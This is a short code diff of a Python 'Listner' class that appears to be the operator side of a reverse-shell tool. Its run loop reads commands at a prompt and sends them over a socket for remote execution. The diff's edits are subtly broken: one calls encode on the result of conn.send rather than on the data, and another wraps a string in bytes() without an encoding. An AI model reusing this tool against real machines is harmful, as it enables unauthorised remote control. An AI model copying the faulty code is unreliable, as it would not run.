@@ -15,10 +15,10 @@ class Listner:
 
     def reliable_send(self,data):
         json_data = json.dumps(data)
-        self.conn.send(bytes(json_data))
+        self.conn.send(json_data).encode('ascii')
 
     def reliable_recieve(self):
-        json_data = self.conn.recv(1024)
+        json_data = self.conn.recv(1024).decode('ascii')
         return json.loads(json_data)
 
     def execute_remotely(self,command):
@@ -28,7 +28,7 @@ class Listner:
     def run(self):
         while(True):
             command = input(">> ")
-            result = self.execute_remotely(command)
+            result = self.execute_remotely(bytes(command))
             print(result)
 
 
